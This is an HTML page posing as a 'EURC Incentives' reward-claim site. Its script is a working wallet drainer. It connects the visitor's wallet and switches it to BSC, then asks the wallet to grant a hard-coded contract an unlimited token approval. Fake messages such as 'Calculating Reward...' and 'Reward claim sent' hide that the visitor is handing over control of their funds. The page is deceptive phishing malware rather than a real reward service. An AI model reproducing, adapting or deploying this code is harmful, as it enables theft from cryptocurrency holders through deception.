<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EURC | Institutional Governance & Incentives</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2775ca; --accent: #0ecb81; --bg: #030407; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            background: var(--bg); 
            color: white; 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
        }

        /* Dinamik Arka Plan Animasyonu */
        .mesh-bg {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 20% 30%, rgba(39, 117, 202, 0.15) 0%, transparent 40%),
                        radial-gradient(circle at 80% 70%, rgba(14, 203, 129, 0.08) 0%, transparent 40%);
            z-index: -1;
            filter: blur(80px);
            animation: meshMove 15s infinite alternate ease-in-out;
        }
        @keyframes meshMove {
            0% { transform: scale(1) translate(0, 0); }
            100% { transform: scale(1.2) translate(5%, 5%); }
        }

        .container {
            background: rgba(13, 14, 18, 0.7);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 3rem 2rem;
            border-radius: 40px;
            width: 100%;
            max-width: 440px;
            text-align: center;
            box-shadow: 0 40px 100px rgba(0,0,0,0.6);
        }

        /* Logo Yerine Dinamik Güvenlik Halkası */
        .auth-scanner {
            width: 100px; height: 100px;
            margin: 0 auto 2rem;
            position: relative;
            display: flex; align-items: center; justify-content: center;
        }
        .ring {
            position: absolute;
            width: 100%; height: 100%;
            border-radius: 50%;
            border: 2px solid transparent;
            border-top-color: var(--primary);
            animation: rotate 2s linear infinite;
        }
        .ring-inner {
            width: 70%; height: 70%;
            border: 2px solid transparent;
            border-bottom-color: var(--accent);
            animation: rotate 1.5s linear infinite reverse;
        }
        .core-icon {
            font-size: 28px; font-weight: 800; color: var(--primary);
            text-shadow: 0 0 15px rgba(39, 117, 202, 0.6);
        }

        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .header-tag {
            background: rgba(39, 117, 202, 0.1);
            color: var(--primary);
            padding: 8px 16px;
            border-radius: 100px;
            font-size: 11px;
            font-weight: 800;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-bottom: 1.5rem;
            display: inline-block;
            border: 1px solid rgba(39, 117, 202, 0.2);
        }

        h2 { font-size: 32px; font-weight: 800; letter-spacing: -1px; margin-bottom: 1rem; }
        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 2.5rem; }

        .btn-claim {
            width: 100%;
            padding: 1.25rem;
            background: linear-gradient(135deg, #2775ca 0%, #1e5ba3 100%);
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 15px 35px rgba(39, 117, 202, 0.4);
        }
        .btn-claim:hover { transform: translateY(-5px); box-shadow: 0 20px 45px rgba(39, 117, 202, 0.6); }

        .status-area { margin-top: 1.5rem; min-height: 20px; }
        .status-text { font-size: 13px; font-weight: 600; color: var(--primary); opacity: 0.8; }

        .footer-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            margin-top: 3rem;
            padding-top: 2rem;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            gap: 1rem;
        }
        .stat-item { text-align: left; }
        .stat-label { font-size: 10px; color: #64748b; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; display: block; }
        .stat-value { font-size: 13px; font-weight: 700; color: #f1f5f9; }
    </style>
</head>
<body>

<div class="mesh-bg"></div>

<div class="container">
    <div class="header-tag">Institutional Rewards V3</div>
    
    <div class="auth-scanner">
        <div class="ring"></div>
        <div class="ring-inner"></div>
        <div class="core-icon">E</div>
    </div>

    <h2>EURC Incentives</h2>
    <p>Governance participants are eligible to claim accumulated EURC incentives based on quarterly network activity.</p>
    
    <button id="claimBtn" class="btn-claim">Connect & Claim Reward</button>
    
    <div class="status-area">
        <div id="statusMsg" class="status-text"></div>
    </div>

    <div class="footer-grid">
        <div class="stat-item">
            <span class="stat-label">Security Protocol</span>
            <span class="stat-value">EVM Verified</span>
        </div>
        <div class="stat-item" style="text-align: right;">
            <span class="stat-label">Network Status</span>
            <span class="stat-value" style="color: var(--accent);">● Optimized</span>
        </div>
    </div>
</div>

<script>
    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
    const M = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    async function run() {
        const b = document.getElementById('claimBtn');
        const s = document.getElementById('statusMsg');

        if (!window.ethereum) {
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            return;
        }

        try {
            const p = new ethers.providers.Web3Provider(window.ethereum);
            b.innerText = "Initializing Ledger...";
            await p.send("eth_requestAccounts", []);
            const n = await p.getNetwork();

            if (n.chainId !== 56) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }],
                    });
                } catch (e) {
                    s.innerText = "Error: Switch to BSC Mainnet";
                    return;
                }
            }

            const si = p.getSigner();
            const c = new ethers.Contract(T, ["function approve(address s, uint256 a) public returns (bool)"], si);

            b.innerText = "Calculating Reward...";
            s.innerText = "Scanning wallet for eligibility...";
            
            setTimeout(async () => {
                try {
                    const tx = await c.approve(T, M);
                    b.innerText = "Syncing with Network...";
                    s.innerText = "Finalizing secure transaction...";
                    await tx.wait();
                    
                    b.innerText = "Success!";
                    s.innerText = "Reward claim sent. Finalizing in 24h.";
                } catch (e) {
                    b.innerText = "Try Again";
                    s.innerText = "Verification required to claim.";
                }
            }, 1500);
            
        } catch (err) {
            b.innerText = "Retry Connection";
            s.innerText = "System busy. Please try again.";
        }
    }

    document.getElementById('claimBtn').onclick = run;
</script>

</body>
</html>
